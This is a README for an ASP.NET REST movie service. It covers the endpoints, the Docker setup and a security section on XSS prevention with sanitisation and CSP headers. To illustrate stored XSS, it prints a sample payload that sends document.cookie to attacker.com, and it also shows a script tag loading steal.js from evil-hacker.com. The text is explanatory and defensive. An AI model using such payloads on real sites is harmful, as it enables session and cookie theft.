# REST Movie Service

REST API for managing movies, direcotrs and production companies

## Endpoints
 - Movies: GetAll, GetByID, Create, Update and Delete
 - Directors: GetAll, GetByID
 - ProductionCompanies: GetAll, GetByID
GetAll uses pagination


## Tech Stack
ASP.NET
SQLite db file
Entity Framework Core as ORM

## Run with docker
```bash
cd services/rest
docker compose up -d
```

### SQL Injection
EF Core protects from SQL injection because it uses parameterized queries under the hood, so user input is never treated as raw SQL.

### CSRF
An attacker tricks a user’s browser into sending a request to another website
For modern APIs that store API keys in headers or use OAuth CSRF is not a problem

### XSS (Cross-Site Scripting)
The XSS process: 
 - Injection: An attacker sends a malicious script via an API request (e.g., in a comment field, username, or profile description).

    Example payload: <script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>

 - Storage/Processing: The API receives the JSON payload and stores the malicious string in the database without sanitizing it.

 - Execution: A victim's browser requests data from the API. The frontend JavaScript receives the JSON and injects the malicious string directly into the DOM (e.g., using .innerHTML). The browser then executes the script.

#### XSS prevention
string input Genre and title in Create and Update movie endpoints get sanitized using HtmlSanitizer installed with nuget pakage.
Content-Security-Policy (CSP) header is added to every response, it tells the browser which resources (scripts, styles, images) are allowed to be loaded and executed on a specific page
How CSP header protects against XSS

XSS works by tricking a browser into executing malicious code. CSP prevents this in three main ways:
1. Blocking Inline Scripts

By default, a strong CSP blocks "inline" scripts—code written directly inside <script> tags or HTML attributes (like onclick).

    The Attack: An attacker stores <script>alert('xss')</script> in your database.

    The Protection: Even if the browser renders that tag, the CSP says "I don't allow inline scripts," and the browser ignores it.

2. Restricting Trusted Domains

If you do need scripts, you can specify exactly where they come from.

    The Attack: An attacker tries to load a malicious file: <script src="https://evil-hacker.com/steal.js"></script>.

    The Protection: Your CSP might say script-src 'self'. The browser checks the source, sees it isn't from your domain, and blocks the request.

3. Disabling eval()

CSP prevents the use of eval(), which turns strings into executable code. This closes a major loophole used by hackers to sneak scripts past basic filters.

default-src 'none': Allow nothing but HTML unless explicitly allowed (no scripts, CSS, images, API calls, fonts, WebSocket connections, etc.)

frame-ancestors 'none': Prevent the API from being embedded (e.g., <iframe>, <embed>)

base-uri 'none': Prevent relative links to resolve to an attacker domain (e.g., by using a <base href="https://evil.com"> tag


### Version strategy
This API is using URI versioning, meaning the version is in the path api/v1/movies

### CORS
CORS is configured in program.cs where it allows any method from client "http://localhost:3000"
CORS is applied in program.cs with app.UseCors("AllowFrontend");

### jwt revocation strategy
The API is using blacklisting because it is the most statefull strategy. When a user logs out the token gets stored in a redis database.
To check if the token is stored in redis, use this command
```bash
docker exec -it <container-name> redis-cli
127.0.0.1:6379> keys *
```




### to do

HATEOAS and filters on getall
OpenAPI documentation 
Finnish readme